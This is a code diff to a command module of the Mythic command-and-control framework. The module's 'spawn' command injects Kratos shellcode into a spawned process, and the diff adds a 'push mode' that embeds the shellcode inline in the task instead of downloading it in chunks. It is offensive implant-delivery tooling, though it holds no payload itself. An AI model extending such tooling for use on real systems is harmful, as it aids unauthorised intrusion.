@@ -1,4 +1,5 @@
 import asyncio
+import base64 as _base64
 
 from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
@@ -17,13 +18,22 @@ class SpawnArguments(TaskArguments):
                 description="Kratos shellcode payload to inject into the spawnto process",
             ),
             CommandParameter(
+                name="push_mode",
+                cli_name="PushMode",
+                display_name="Push Mode",
+                type=ParameterType.Boolean,
+                default_value=False,
+                description="Embed shellcode inline in task params (one shot, no chunk download). Faster but larger get_tasking response.",
+                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=1)],
+            ),
+            CommandParameter(
                 name="chunk_size_mb",
                 cli_name="ChunkSizeMB",
                 display_name="Chunk Size (MB)",
                 type=ParameterType.Number,
                 default_value=4,
-                description="Shellcode download chunk size in MB. Larger = fewer round-trips = faster.",
-                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=1)],
+                description="Shellcode download chunk size in MB (pull mode only). Larger = fewer round-trips = faster.",
+                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=2)],
             ),
         ]
 
@@ -141,9 +151,20 @@ class SpawnCommand(CommandBase):
         else:
             taskData.args.add_arg("shellcode_md5", "", ParameterType.String)
 
-        chunk_size_mb = int(taskData.args.get_arg("chunk_size_mb") or 4)
-        taskData.args.add_arg("sc_chunk_size", chunk_size_mb * 1024 * 1024, ParameterType.Number)
+        push_mode = taskData.args.get_arg("push_mode") or False
         taskData.args.add_arg("file", file_id, ParameterType.String)
+        if push_mode:
+            file_content = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
+                AgentFileId=file_id,
+            ))
+            if not file_content.Success:
+                raise Exception(f"Failed to retrieve shellcode content: {file_content.Error}")
+            taskData.args.add_arg("sc_chunk_size", len(file_content.Content), ParameterType.Number)
+            response.DisplayParams += " | push"
+        else:
+            chunk_size_mb = int(taskData.args.get_arg("chunk_size_mb") or 4)
+            taskData.args.add_arg("sc_chunk_size", chunk_size_mb * 1024 * 1024, ParameterType.Number)
+            response.DisplayParams += " | pull"
         taskData.args.remove_arg("template")
         return response
 
